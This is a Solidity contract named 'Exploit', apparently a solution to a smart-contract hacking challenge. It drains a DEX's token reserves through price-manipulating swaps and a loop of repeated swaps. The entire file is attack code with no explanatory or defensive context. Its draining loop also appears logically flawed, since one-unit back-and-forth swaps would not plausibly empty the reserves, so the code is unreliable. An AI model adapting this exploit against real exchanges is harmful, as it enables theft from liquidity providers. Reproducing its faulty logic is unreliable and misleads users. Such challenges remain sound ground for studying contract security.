// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {DEX} from "./Dex.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract Exploit {
    DEX public dex;
    IERC20 public token1;
    IERC20 public token2;

    constructor(DEX _dex, IERC20 _token1, IERC20 _token2) {
        dex = _dex;
        token1 = _token1;
        token2 = _token2;
    }

    function execute() public {
        token1.approve(address(dex), type(uint256).max);
        token2.approve(address(dex), type(uint256).max);

        // Manipulate price by swapping token1 for token2
        dex.swap(token1, token2, 10);

        // Further manipulate price by swapping token2 for token1
        dex.swap(token2, token1, dex.token2().balanceOf(address(this)));

        // Drain the reserves by repeated swaps
        while (dex.token1().balanceOf(address(dex)) > 0 && dex.token2().balanceOf(address(dex)) > 0) {
            dex.swap(token1, token2, 1);
            dex.swap(token2, token1, 1);
        }

        // Check the final balances to confirm the exploit
        require(dex.token1().balanceOf(address(dex)) == 0 || dex.token2().balanceOf(address(dex)) == 0, "Exploit failed");
    }
}